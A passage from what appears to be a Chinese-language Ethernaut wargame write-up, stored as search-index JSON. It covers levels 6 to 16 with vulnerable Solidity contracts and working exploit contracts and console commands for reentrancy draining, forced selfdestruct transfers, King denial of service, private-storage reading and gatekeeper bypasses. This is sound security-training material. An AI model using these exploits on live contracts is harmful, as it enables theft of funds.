\u9664\u4e86\u5411\u5408\u7ea6\u8f6c\u8d26\u4f1a\u89e6\u53d1 fallback \u51fd\u6570\u5916\uff0c\u82e5\u88ab\u8c03\u7528\u7684\u51fd\u6570\u4e0d\u5b58\u5728\u540c\u6837\u4f1a\u89e6\u53d1 \u8c03\u7528 Delegation \u4e0d\u5b58\u5728\u7684\u51fd\u6570 pwn \u6765\u89e6\u53d1 fallback \u51fd\u6570\uff0c\u4ece\u800c\u6267\u884c\u771f\u6b63\u7684 pwn \u51fd\u6570 1 2 3 // keccak256 \u5373 sha3 >> await contract . sendTransaction ({ data : web3 . utils . sha3 ( \"pwn()\" )}) >> await contract . owner () \u4ee3\u7406\u8c03\u7528\u529f\u80fd\u5f3a\u5927\u4e14\u5371\u9669\uff0c\u614e\u7528 \ud83d\udc40","title":"6. Delegation"},{"location":"wargames/ethernaut/#_4","text":"SHA-3 - \u7ef4\u57fa\u767e\u79d1\uff0c\u81ea\u7531\u7684\u767e\u79d1\u5168\u4e66 sha3","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#7-force","text":"\u4f7f\u5408\u7ea6\u7684\u4f59\u989d\u5927\u4e8e 0 1 2 3 4 5 6 7 8 9 10 11 12 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Force { /* MEOW ? /\\_/\\ / ____/ o o \\ /~____ =\u00f8= / (______)__m_m) */ } \u5f53\u5408\u7ea6\u81ea\u6bc1\u65f6\uff0c\u5408\u7ea6\u4f59\u989d\u5c06\u8f6c\u7ed9\u6307\u5b9a\u76ee\u6807 \u5373\u4f7f\u5408\u7ea6\u4ee3\u7801\u4e0d\u5305\u542b selfdestruct \u7684\u8c03\u7528\uff0c\u4ecd\u7136\u53ef\u4ee5\u901a\u8fc7 delegatecall \u6216 callcode \u6765\u6267\u884c\u81ea\u6bc1\u64cd\u4f5c 1 2 3 4 5 6 7 8 9 10 11 12 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Hack { function pay () public payable {} function exploit ( address instance ) public { // \u58f0\u660e payable \u7684\u51fd\u6570\u548c\u5730\u5740\u90fd\u53ef\u4ee5\u63a5\u53d7\u8f6c\u8d26 selfdestruct ( payable ( instance )); } } \u5728 Remix \u5411\u5408\u7ea6 Hack \u8f6c\u8d26 \u5982\u679c\u5408\u7ea6\u4e2d\u5305\u542b\u58f0\u660e\u4e86 payable \u7684 receive \u6216 fallback \u51fd\u6570\uff0c\u4e5f\u53ef\u4ee5\u5728\u586b\u5199\u5b8c VALUE \u540e\u76f4\u63a5\u70b9\u51fb\u300cTransact\u300d\uff1b\u6216\u901a\u8fc7\u58f0\u660e\u4e86 payable \u7684\u6784\u9020\u51fd\u6570\uff0c\u5728\u521b\u5efa\u5408\u7ea6\u65f6\u8f6c\u8d26 \u901a\u8fc7\u81ea\u6bc1\u7684\u8f6c\u8d26\u65b9\u5f0f\u65e0\u6cd5\u963b\u6b62\uff0c\u56e0\u6b64\u4efb\u4f55\u5408\u7ea6\u903b\u8f91\u90fd\u4e0d\u5e94\u57fa\u4e8e address(this).balance == 0","title":"7. Force"},{"location":"wargames/ethernaut/#_5","text":"Deactivate and Self-destruct Payable | Solidity by Example Low level interactions","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#8-vault","text":"\u89e3\u9501\u4fdd\u9669\u67dc 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Vault { bool public locked ; bytes32 private password ; constructor ( bytes32 _password ) { locked = true ; password = _password ; } function unlock ( bytes32 _password ) public { if ( password == _password ) { locked = false ; } } } \u731c\u5bc6\u7801\u662f\u4e0d\u53ef\u80fd\u731c\u7684~ XD \u533a\u5757\u94fe\u4e0a\u6240\u6709\u4fe1\u606f\u90fd\u662f\u516c\u5f00\u7684\uff0c\u5305\u62ec\u58f0\u660e\u4e3a private \u7684\u53d8\u91cf \u5408\u7ea6\u4e2d\u7684\u53d8\u91cf\u6309\u7167\u5b9a\u4e49\u7684\u987a\u5e8f\u5b58\u50a8\u5728 slot \u4e2d 1 2 3 4 5 6 // \u9996\u5148\u786e\u5b9a\u53d8\u91cf\u5b9a\u4e49\u7684\u987a\u5e8f\uff0c\u7b2c\u4e00\u4e2a\u53d8\u91cf\u5b58\u50a8\u5728 slot 0\uff0c\u7b2c\u4e8c\u4e2a\u53d8\u91cf\u5b58\u50a8\u5728 slot 1\uff0c\u4ee5\u6b64\u7c7b\u63a8 >> await web3 . eth . getStorageAt ( instance , 1 ) \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" >> web3 . utils . toAscii ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) \"A very strong secret password :)\" >> await contract . unlock ( \"0x412076657279207374726f6e67207365637265742070617373776f7264203a29\" ) \u5c06\u53d8\u91cf\u58f0\u660e\u4e3a private \u53ea\u80fd\u9632\u6b62\u5176\u5b83\u5408\u7ea6\u8bbf\u95ee \u4e3a\u4e86\u4fdd\u8bc1\u6570\u636e\u7684\u673a\u5bc6\u6027\uff0c\u5e94\u5728\u4e0a\u94fe\u524d\u52a0\u5bc6\uff0c\u5bc6\u94a5\u7edd\u5bf9\u4e0d\u80fd\u516c\u5f00\u3002 zk-SNARKs \u63d0\u4f9b\u4e86\u4e00\u79cd\u5728\u4e0d\u66b4\u9732\u79d8\u5bc6\u4fe1\u606f\u7684\u60c5\u51b5\u4e0b\uff0c\u8bc1\u660e\u67d0\u4eba\u662f\u5426\u6301\u6709\u79d8\u5bc6\u4fe1\u606f\u7684\u65b9\u6cd5","title":"8. Vault"},{"location":"wargames/ethernaut/#_6","text":"Crypto Market Pool - Access private data on the Ethereum blockchain","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#9-king","text":"\u963b\u6b62\u5173\u5361\u5b9e\u4f8b\u5728\u63d0\u4ea4\u540e\u91cd\u65b0\u58f0\u660e\u56fd\u738b\u8eab\u4efd 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract King { address king ; uint public prize ; address public owner ; constructor () payable { owner = msg . sender ; king = msg . sender ; prize = msg . value ; } receive () external payable { // \u5373\u4f7f\u8f6c\u8d26\u91d1\u989d\u5c0f\u4e8e prize\uff0c\u5408\u7ea6\u7684\u6240\u6709\u8005\u4e5f\u53ef\u4ee5\u58f0\u660e\u56fd\u738b\u8eab\u4efd require ( msg . value >= prize || msg . sender == owner ); // \u5f53\u524d\u7684\u8f6c\u8d26\u91d1\u989d\u4f1a\u8f6c\u7ed9\u4e0a\u4e00\u4efb\u56fd\u738b payable ( king ). transfer ( msg . value ); king = msg . sender ; prize = msg . value ; // \u66f4\u65b0 prize } function _king () public view returns ( address ) { return king ; } } \u5f53 transfer \u6267\u884c\u5931\u8d25\u65f6\uff0c\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u4ea4\u6613\u56de\u6eda\uff0c\u5173\u5361\u5b9e\u4f8b\u5c31\u65e0\u6cd5\u518d\u58f0\u660e\u56fd\u738b\u8eab\u4efd\u4e86 \u67e5\u770b\u5f53\u524d\u6700\u9ad8\u91d1\u989d 1 2 >> web3 . utils . toWei ( web3 . utils . fromWei ( await contract . prize ())) \"1000000000000000\" \u65b0\u5efa\u5408\u7ea6\uff0c\u7528\u4e8e\u58f0\u660e\u56fd\u738b\u8eab\u4efd\uff0c\u5e76\u963b\u6b62\u5173\u5361\u5b9e\u4f8b\u518d\u6210\u4e3a\u56fd\u738b 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Hack { constructor () payable {} function exploit ( address instance ) public { payable ( instance ). call { value : 0.001 * ( 1 ether )}( \"\" ); // \u6c7d\u6cb9\u91cf\u4e00\u5b9a\u8981\u7ed9\u8db3\uff01 // \u4e0d\u80fd\u4f7f\u7528 transfer/send\uff0c\u9ed8\u8ba4 2300 \u6c7d\u6cb9\u8d39\u4e0d\u8db3\u4ee5\u652f\u6491\u540e\u7eed\u64cd\u4f5c } receive () external payable { revert (); // \u4f7f king.transfer \u65e0\u6cd5\u6210\u529f\u6267\u884c } }","title":"9. King"},{"location":"wargames/ethernaut/#10-re-entrancy","text":"\u7a83\u53d6\u5408\u7ea6\u6240\u6709\u7684\ud83d\udcb0 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.12 ; import '@openzeppelin/contracts/math/SafeMath.sol' ; contract Reentrance { using SafeMath for uint256 ; mapping ( address => uint ) public balances ; function donate ( address _to ) public payable { balances [ _to ] = balances [ _to ]. add ( msg . value ); } function balanceOf ( address _who ) public view returns ( uint balance ) { return balances [ _who ]; } // \u5229\u7528\u5148\u8f6c\u518d\u51cf function withdraw ( uint _amount ) public { if ( balances [ msg . sender ] >= _amount ) { ( bool result ,) = msg . sender . call { value : _amount }( \"\" ); if ( result ) { _amount ; } balances [ msg . sender ] -= _amount ; } } receive () external payable {} } \u5728\u63a5\u6536\u5408\u7ea6\u7684 fallback \u51fd\u6570\u4e2d\u518d\u8c03\u7528 withdraw \u51fd\u6570 \u5148\u770b\u770b\u5408\u7ea6\u7684\u521d\u59cb\u8d44\u91d1 1 2 >> await web3 . eth . getBalance ( instance ) \"1000000000000000\" \u8ba1\u5212\u5206 9 \u6b21\u53d6\u5b8c\uff08\u4e5f\u53ef\u4ee5\u591a\u6350\u8d60\uff0c\u51cf\u5c11\u53d6\u51fa\u6b21\u6570\uff09 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 // SPDX-License-Identifier: MIT pragma solidity ^ 0.6.12 ; import 'https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol' ; contract Reentrance { using SafeMath for uint256 ; mapping ( address => uint ) public balances ; function donate ( address _to ) public payable { balances [ _to ] = balances [ _to ]. add ( msg . value ); } function balanceOf ( address _who ) public view returns ( uint balance ) { return balances [ _who ]; } function withdraw ( uint _amount ) public { if ( balances [ msg . sender ] >= _amount ) { ( bool result ,) = msg . sender . call { value : _amount }( \"\" ); if ( result ) { _amount ; // does nothing } balances [ msg . sender ] -= _amount ; } } receive () external payable {} } contract Hack { Reentrance reentrance ; function exploit ( address payable instance ) public { reentrance = Reentrance ( instance ); reentrance . withdraw ( 125000000000000 ); } receive () external payable { if ( msg . sender . balance >= msg . value && gasleft () > 6000 ) { reentrance . withdraw ( 125000000000000 ); } } } \u5408\u7ea6 Hack \u90e8\u7f72\u5b8c\u6210\u540e\uff0c\u8fdb\u884c\u300c\u6350\u8d60\u300d 1 2 3 >> await contract . donate ( \"<hack-address>\" , { value : 125000000000000 }); >> web3 . utils . fromWei ( await contract . balanceOf ( \"<hack-address>\" )) \"0.000125\" \u968f\u540e\u5f00\u59cb\u300c\u76d7\u94b1\u300d\uff0c\u52a1\u5fc5\u7ed9\u8db3\u6c7d\u6cb9 :) > \u672c\u6b21\u6c7d\u6cb9\u91cf\u53c2\u8003\uff1a200,000 | 156,169 (78.08%) \u4e0d\u63a8\u8350\u4f7f\u7528 transfer \u548c send \u6765\u4ee3\u66ff call \uff0c\u53ef\u80fd\u5f71\u54cd Istanbul \u786c\u5206\u53c9\u4e4b\u540e\u7684\u5408\u7ea6\uff08\u90e8\u5206\u6307\u4ee4\u6d88\u8017\u6c7d\u6cb9\u91cf\u589e\u52a0\uff09 \u6c38\u8fdc\u5047\u8bbe\u8f6c\u8d26\u7684\u63a5\u6536\u65b9\u662f\u53e6\u4e00\u4e2a\u5408\u7ea6\uff0c\u800c\u975e\u666e\u901a\u7684\u5730\u5740","title":"10. Re-entrancy"},{"location":"wargames/ethernaut/#11-elevator","text":"\u5230\u8fbe\u9876\u5c42\uff01 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; interface Building { function isLastFloor ( uint ) external returns ( bool ); } contract Elevator { bool public top ; uint public floor ; function goTo ( uint _floor ) public { Building building = Building ( msg . sender ); if ( ! building . isLastFloor ( _floor )) { // \u7b2c\u4e00\u6b21\u8fd4\u56de false floor = _floor ; top = building . isLastFloor ( floor ); // \u7b2c\u4e8c\u6b21\u8fd4\u56de true } } } Interface \u5185\u90e8\u4e0d\u80fd\u5b9e\u73b0\u4efb\u4f55\u51fd\u6570\uff0c\u4f46\u53ef\u4ee5\u7ee7\u627f\u81ea\u5176\u5b83\u63a5\u53e3\uff0c\u6240\u6709\u58f0\u660e\u7684\u51fd\u6570\u5fc5\u987b\u662f\u5916\u90e8\u7684\uff0c\u4e0d\u80fd\u58f0\u660e\u6784\u9020\u51fd\u6570\u548c\u72b6\u6001\u53d8\u91cf \u300c\u7535\u68af\u5e94\u8be5\u5728\u5efa\u7b51\u91cc\u300d\uff0c\u5b9e\u73b0\u8fd9\u4e2a Building \u5408\u7ea6\u5c31\u597d\u5566 >_< 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Building { bool public flag = true ; function isLastFloor ( uint ) external returns ( bool ) { flag = ! flag ; return flag ; } function exploit ( address instance ) public { Elevator elevator = Elevator ( instance ); elevator . goTo ( 1 ); } } contract Elevator { bool public top ; uint public floor ; function goTo ( uint _floor ) public { Building building = Building ( msg . sender ); if ( ! building . isLastFloor ( _floor )) { floor = _floor ; top = building . isLastFloor ( floor ); } } } \u63a5\u53e3\u51fd\u6570\u53ef\u4ee5\u901a\u8fc7\u58f0\u660e view \u6765\u9632\u6b62\u72b6\u6001\u88ab\u7be1\u6539\uff0c pure \u540c\u7406 \u5728\u4e0d\u6539\u53d8\u72b6\u6001\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u6839\u636e\u4e0d\u540c\u7684\u8f93\u5165\u6570\u636e\u6765\u8fd4\u56de\u4e0d\u540c\u7684\u7ed3\u679c\uff0c\u5982 gasleft()","title":"11. Elevator"},{"location":"wargames/ethernaut/#_7","text":"Interface | Solidity by Example View Functions","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#12-privacy","text":"\u89e3\u9501\uff01( Vault \u5347\u7ea7\u7248) 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Privacy { // slot 0 bool public locked = true ; // slot 1 uint256 public ID = block . timestamp ; // uint256 is 32 bytes long // slot 2 uint8 private flattening = 10 ; uint8 private denomination = 255 ; uint16 private awkwardness = uint16 ( now ); // slot 3, 4, 5 bytes32 [ 3 ] private data ; constructor ( bytes32 [ 3 ] memory _data ) { data = _data ; } function unlock ( bytes16 _key ) public { require ( _key == bytes16 ( data [ 2 ])); locked = false ; } /* A bunch of super advanced solidity algorithms... ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^` .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*., *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^ ,---/V\\ `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*. ~|__(o.o) ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*' UU UU */ } \u6bcf\u4e2a slot \u5927\u5c0f\u4e3a 32 \u5b57\u8282\uff0c\u5f53\u90bb\u8fd1\u53d8\u91cf\u4e5f\u80fd\u591f\u653e\u8fdb\u5355\u4e2a slot \u65f6\uff0c\u5c06\u6309\u4ece\u53f3\u5230\u5de6\u7684\u987a\u5e8f\u4f9d\u6b21\u653e\u5165 \u5e38\u91cf\u4e0d\u5b58\u50a8 1 2 3 4 5 6 7 8 9 10 11 12 >> await web3 . eth . getStorageAt ( instance , 0 ) \"0x0000000000000000000000000000000000000000000000000000000000000001\" >> await web3 . eth . getStorageAt ( instance , 1 ) \"0x000000000000000000000000000000000000000000000000000000006210d5b1\" >> await web3 . eth . getStorageAt ( instance , 2 ) \"0x00000000000000000000000000000000000000000000000000000000d5b1ff0a\" // 0a for flattening, ff for denomination >> await web3 . eth . getStorageAt ( instance , 3 ) \"0xc3003c2bcb65196b8352fb925d945f9229929bcc727f70ea451255859a6a4f56\" >> await web3 . eth . getStorageAt ( instance , 4 ) \"0x6d6f76ea288ee9c55ab1ad76264518237a23af3495ee5702f57a164f8aeb99b0\" >> await web3 . eth . getStorageAt ( instance , 5 ) \"0x06e3eb3b9e34467cbf1a226fc2bd13e5948a7a15ef2205caf186fa3df3076f53\" // data[2] \u7531\u4e8e _key \u4e3a bytes16 \u7c7b\u578b\uff0c\u9700\u8981\u5bf9 data[2] \u8fdb\u884c\u7c7b\u578b\u8f6c\u6362 1 2 // \u4ece bytes32 \u5230 bytes16\uff0c\u53ea\u9700\u8981\u79fb\u8d70\u53f3\u4fa7\u7684 16 \u5b57\u8282\uff0c\u5373 32 \u4f4d\u5341\u516d\u8fdb\u5236\u6570 >> await contract . unlock ( \"0x06e3eb3b9e34467cbf1a226fc2bd13e5\" )","title":"12. Privacy"},{"location":"wargames/ethernaut/#_8","text":"Accessing Private Data | Solidity by Example","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#13-gatekeeper-one","text":"\u8d8a\u8fc7\u5b88\u95e8\u4eba\u5e76\u6ce8\u518c\u4e3a\u65b0\u6210\u5458 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract GatekeeperOne { address public entrant ; modifier gateOne () { require ( msg . sender != tx . origin ); _ ; } modifier gateTwo () { require ( gasleft () % 8191 == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { // uint64 is 8 bytes long // _gateKey % 2^32 == _gateKey % 2^16 require ( uint32 ( uint64 ( _gateKey )) == uint16 ( uint64 ( _gateKey )), \"GatekeeperOne: invalid gateThree part one\" ); // _gateKey % 2^32 != _gateKey require ( uint32 ( uint64 ( _gateKey )) != uint64 ( _gateKey ), \"GatekeeperOne: invalid gateThree part two\" ); // _gateKey % 2^32 == tx.origin % 2^16 require ( uint32 ( uint64 ( _gateKey )) == uint16 ( uint160 ( tx . origin )), \"GatekeeperOne: invalid gateThree part three\" ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx . origin ; return true ; } } \u4f7f\u7528\u4e0e Telephone \u76f8\u540c\u7684\u65b9\u5f0f\u901a\u8fc7 gateOne \u81f3\u4e8e gateTwo \uff0c\u5728 Remix \u7684 JavaScript VM \u73af\u5883\u4e0b\u901a\u8fc7 Debug \u6765\u83b7\u53d6\u5177\u4f53\u6240\u9700\u6c7d\u6cb9\u91cf \u6ce8\u610f \uff1a\u4e0d\u540c\u7248\u672c\u7684 EVM \u6216\u7f16\u8bd1\u5668\u90fd\u4f1a\u5bfc\u81f4\u4e0d\u540c\u7684\u6c7d\u6cb9\u6d88\u8017\u91cf \u9996\u5148\u9009\u62e9\u4e00\u4e2a\u8f83\u5927\u7684\u6c7d\u6cb9\u91cf\uff0c\u5982 90000 \u6267\u884c\u5b8c\u6210\u540e\uff0c\u8fdb\u5165 DEBUGGER \uff0c\u6267\u884c\u5b8c\u64cd\u4f5c\u7801 GAS \uff0c\u6b64\u65f6\u5269\u4f59\u7684\u6c7d\u6cb9\u91cf\u4e3a 89577 \u7531\u6b64\u53ef\u8ba1\u7b97\u51fa\u901a\u8fc7 gateTwo \u5b9e\u9645\u9700\u8981\u7684\u6700\u5c11\u6c7d\u6cb9\u91cf\uff1a \\(90000-89577+8191\\times 3=24996\\) entrant = tx.origin \u5305\u542b SSTORE \u64cd\u4f5c\u7801\uff0c\u56e0\u4e3a entrant \u672a\u88ab\u5199\u5165\u8fc7\uff0c\u81f3\u5c11\u9700\u8981\u6d88\u8017 20000 \u6c7d\u6cb9 \u5728 Goerli \u6d4b\u8bd5\u7f51\u7edc\u4e2d\u8fd0\u884c\u65f6\u4f1a\u629b\u51fa\u5f02\u5e38\uff0c\u518d\u6b21\u8c03\u8bd5\uff0c\u89c2\u5bdf\u6808\u4e2d\u51fa\u73b0 0x1fff(8191) \u7684\u4e0b\u4e00\u4e2a\u6570\u5b57\uff0c\u4e3a 0x60a4(24740) \uff0c\u5f97\u51fa\u6700\u7ec8\u9700\u8981\u7684\u6c7d\u6cb9\u91cf\u4e3a\uff1a \\(24996-24740+8191\\times 3=24829\\) \u5bf9\u4e8e gateThree \uff0c\u7528 \\(A_0A_1...A_7\\) \u6765\u8868\u793a _gateKey \u7684\u5404\u4e2a\u5b57\u8282 part one \u9700\u6ee1\u8db3 \\(A_4A_5A_6A_7 = A_6A_7\\) part two \u9700\u6ee1\u8db3 \\(A_4A_5A_6A_7 \\neq A_0A_1...A_7\\) part three \u9700\u6ee1\u8db3 \\(A_4A_5A_6A_7 = B_6B_7\\) \uff08\u89c6\u4f5c tx.origin \u540e\u4e24\u4e2a\u5b57\u8282\uff09 \u4e5f\u5c31\u662f\u8bf4\uff0c _gateKey \u53ea\u9700\u8981\u540e\u4e24\u4e2a\u5b57\u8282\u4e0e tx.origin \u4e00\u81f4\uff0c\u5012\u6570\u4e09\u56db\u5b57\u8282\u4e3a \\(0\\) \uff0c\u5269\u4e0b\u56db\u4e2a\u5b57\u8282\u4e0d\u4e3a \\(0\\) \u5c31\u53ef\u4ee5\u4e86 >v< 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract GatekeeperOne { address public entrant ; modifier gateOne () { require ( msg . sender != tx . origin ); _ ; } modifier gateTwo () { require ( gasleft () % 8191 == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { require ( uint32 ( uint64 ( _gateKey )) == uint16 ( uint64 ( _gateKey )), \"GatekeeperOne: invalid gateThree part one\" ); require ( uint32 ( uint64 ( _gateKey )) != uint64 ( _gateKey ), \"GatekeeperOne: invalid gateThree part two\" ); require ( uint32 ( uint64 ( _gateKey )) == uint16 ( uint160 ( tx . origin )), \"GatekeeperOne: invalid gateThree part three\" ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx . origin ; return true ; } } contract Hack { function exploit ( address instance ) public { GatekeeperOne gk = GatekeeperOne ( instance ); bytes8 _gateKey = bytes8 ( uint64 ( uint160 ( tx . origin )) & 0xff0000ffff ); gk . enter { gas : 24829 }( _gateKey ); } }","title":"13. Gatekeeper One"},{"location":"wargames/ethernaut/#_9","text":"Solidity variables \u2014 storage, type conversions and accessing private variables solidity - Why does Remix's jsVM show incorrect gas? - Ethereum Stack Exchange Opcodes for the EVM | ethereum.org","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#14-gatekeeper-two","text":"\u901a\u8fc7\u65b0\u7684\u6311\u6218\uff01 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract GatekeeperTwo { address public entrant ; modifier gateOne () { require ( msg . sender != tx . origin ); _ ; } modifier gateTwo () { uint x ; assembly { x := extcodesize ( caller ()) } // \u5185\u8054\u6c47\u7f16 // caller() - call sender (excluding delegatecall) // extcodesize(a) - size of the code at address a require ( x == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { require ( uint64 ( bytes8 ( keccak256 ( abi . encodePacked ( msg . sender )))) ^ uint64 ( _gateKey ) == type ( uint64 ). max ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx . origin ; return true ; } } gateTwo \u9700\u8981\u8c03\u7528\u5408\u7ea6\u7684\u4ee3\u7801\u957f\u5ea6\u4e3a 0\uff0c\u4e0e\u89e3\u9898\u77db\u76fe\u3002 ETHEREUM: A SECURE DECENTRALISED GENERALISED TRANSACTION LEDGER \u4e2d\u63d0\u5230\uff0c\u5728\u4ee3\u7801\u521d\u59cb\u5316\u65f6\uff0c\u5bf9\u5e94\u5730\u5740\u7684 EXTCODESIZE \u5e94\u8fd4\u56de 0\uff0c\u90a3\u4e48\u53ea\u9700\u8981\u5728\u6784\u9020\u51fd\u6570\u91cc\u8c03\u7528 enter \u5c31\u53ef\u4ee5\u4e86 \u81f3\u4e8e gateThree \uff0c\u4f7f\u7528\u5f02\u6216\u9006\u8fd0\u7b97\u6c42\u89e3\u5c31\u597d\u5566 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract GatekeeperTwo { address public entrant ; modifier gateOne () { require ( msg . sender != tx . origin ); _ ; } modifier gateTwo () { uint x ; assembly { x := extcodesize ( caller ()) } require ( x == 0 ); _ ; } modifier gateThree ( bytes8 _gateKey ) { require ( uint64 ( bytes8 ( keccak256 ( abi . encodePacked ( msg . sender )))) ^ uint64 ( _gateKey ) == type ( uint64 ). max ); _ ; } function enter ( bytes8 _gateKey ) public gateOne gateTwo gateThree ( _gateKey ) returns ( bool ) { entrant = tx . origin ; return true ; } } contract Hack { constructor ( address instance ) { GatekeeperTwo gk = GatekeeperTwo ( instance ); gk . enter ( bytes8 ( uint64 ( bytes8 ( keccak256 ( abi . encodePacked ( address ( this ))))) ^ ( type ( uint64 ). max ))); } }","title":"14. Gatekeeper Two"},{"location":"wargames/ethernaut/#_10","text":"Inline Assembly","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#15-naught-coin","text":"\u53d6\u51fa\u88ab\u9501\u4f4f\u7684\u786c\u5e01\uff0c\u6e05\u7a7a\u81ea\u5df1\u7684\u4f59\u989d 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; import '@openzeppelin/contracts/token/ERC20/ERC20.sol' ; contract NaughtCoin is ERC20 { // \u57fa\u4e8e ERC20 // string public constant name = 'NaughtCoin'; // string public constant symbol = '0x0'; // uint public constant decimals = 18; uint public timeLock = block . timestamp + 10 * 365 days ; uint256 public INITIAL_SUPPLY ; address public player ; constructor ( address _player ) ERC20 ( 'NaughtCoin' , '0x0' ) { player = _player ; INITIAL_SUPPLY = 1000000 * ( 10 ** uint256 ( decimals ())); // _totalSupply = INITIAL_SUPPLY; // _balances[player] = INITIAL_SUPPLY; _mint ( player , INITIAL_SUPPLY ); // Creates INITIAL_SUPPLY tokens and assigns them to player emit Transfer ( address ( 0 ), player , INITIAL_SUPPLY ); } function transfer ( address _to , uint256 _value ) override public lockTokens returns ( bool ) { // super \u7ee7\u627f\u76f4\u63a5\u7236\u5408\u7ea6\u7684 transfer \u51fd\u6570 super . transfer ( _to , _value ); // \u5c06\u8c03\u7528\u8005 _value \u6570\u91cf\u7684\u91d1\u989d\u8f6c\u79fb\u7ed9 _to } // Prevent the initial owner from transferring tokens until the timelock has passed modifier lockTokens () { if ( msg . sender == player ) { require ( block . timestamp > timeLock ); _ ; } else { _ ; } } } lockTokens \u9650\u5236\u4e86 player \uff0c\u800c\u88ab\u8986\u5199\u7684 transfer \u53ea\u80fd\u7531\u6301\u6709\u8d27\u5e01\u7684\u8d26\u6237\u53d1\u8d77\u8f6c\u8d26 NaughtCoin \u5408\u7ea6\u662f ERC20 \u7684\u5b50\u5408\u7ea6\uff0c\u5728\u5408\u7ea6 ERC20 \u4e2d\u9664\u4e86\u5b9a\u4e49 transfer \u8fd8\u6709 transferFrom \u51fd\u6570\uff0c\u7531\u6b64\u53ef\u4ee5\u7ed5\u8fc7 lockTokens \u7684\u9650\u5236 1 transferFrom(address sender, address recipient, uint256 amount) \u2192 bool \u5728\u8c03\u7528 transferFrom \u4e4b\u524d\u9700\u8981\u53d6\u5f97 msg.sender \u7684\u6388\u6743 1 >> await contract . approve ( player , await contract . INITIAL_SUPPLY ()) \u53d1\u8d77\u8f6c\u8d26 1 >> await contract . transferFrom ( player , instance , await contract . INITIAL_SUPPLY ())","title":"15. Naught Coin"},{"location":"wargames/ethernaut/#_11","text":"ERC 20 - OpenZeppelin Docs","title":"\u53c2\u8003\u8d44\u6599"},{"location":"wargames/ethernaut/#16-preservation","text":"\u58f0\u660e\u5bf9\u5b9e\u4f8b\u7684\u6240\u6709\u6743 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 // SPDX-License-Identifier: MIT pragma solidity ^ 0.8.0 ; contract Preservation { // public library contracts address public timeZone1Library ; address public timeZone2Library ; address public owner ; uint storedTime ; // Sets the function signature for delegatecall bytes4 constant setTimeSignature = bytes4 ( keccak256 ( \"setTime(uint256)\" )); constructor ( address 